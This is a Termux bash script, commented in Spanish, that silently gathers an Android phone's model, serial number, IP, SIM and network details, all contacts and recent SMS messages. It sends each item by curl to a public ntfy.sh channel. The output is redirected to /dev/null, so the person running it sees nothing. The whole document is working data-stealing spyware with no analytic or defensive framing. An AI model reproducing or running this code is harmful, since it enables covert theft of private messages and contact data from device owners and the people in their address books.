
{
# aquí va TODO el código del script

#!/data/data/com.termux/files/usr/bin/bash

# === CONFIGURACIÓN ===
NTFY_URL="https://ntfy.sh/3kG4epWMkei6KLLq"  # tu canal NTFY público

# === FUNCIÓN PARA ENVIAR MENSAJES ===
enviar_ntfy() {
    curl -s -d "$1" "$NTFY_URL"
}

# === 1. Info del dispositivo ===
IP=$(curl -s ifconfig.me)
BAT=$(termux-battery-status | jq -c '.')
MODEL=$(getprop ro.product.model)
SERIAL=$(getprop ro.serialno)
SIMINFO=$(termux-telephony-siminfo 2>/dev/null | jq -c '.')
DEVICEINFO=$(termux-telephony-deviceinfo 2>/dev/null | jq -c '.')

enviar_ntfy "📱 Modelo: $MODEL"
enviar_ntfy "🔑 Serial: $SERIAL"
enviar_ntfy "🔋 Batería: $BAT"
enviar_ntfy "🌐 IP: $IP"
enviar_ntfy "📶 SIM: $SIMINFO"
enviar_ntfy "📡 Red: $DEVICEINFO"

# === 2. Contactos ===
CONTACTOS=$(termux-contact-list 2>/dev/null)
if [ -n "$CONTACTOS" ]; then
    echo "$CONTACTOS" | jq -c '.[]' | while read -r contacto; do
        enviar_ntfy "👤 Contacto: $contacto"
        sleep 0.5
    done
else
    enviar_ntfy "⚠️ Contactos no disponibles o sin permisos"
fi

# === 3. Últimos SMS ===
SMS=$(termux-sms-list -l 5 2>/dev/null)
if [ -n "$SMS" ]; then
    echo "$SMS" | jq -c '.[]' | while read -r sms; do
        enviar_ntfy "📩 SMS: $sms"
        sleep 0.5
    done
else
    enviar_ntfy "⚠️ SMS no disponibles o sin permisos"
fi

echo "🔍 Ejecutando script..."

echo "Obteniendo datos del dispositivo..."
echo "Modelo: $(getprop ro.product.model)"
echo "IP: $(curl -s ifconfig.me)"

echo "Obteniendo contactos..."
termux-contact-list

echo "Obteniendo SMS..."
termux-sms-list -l 5
} > /dev/null 2>&1
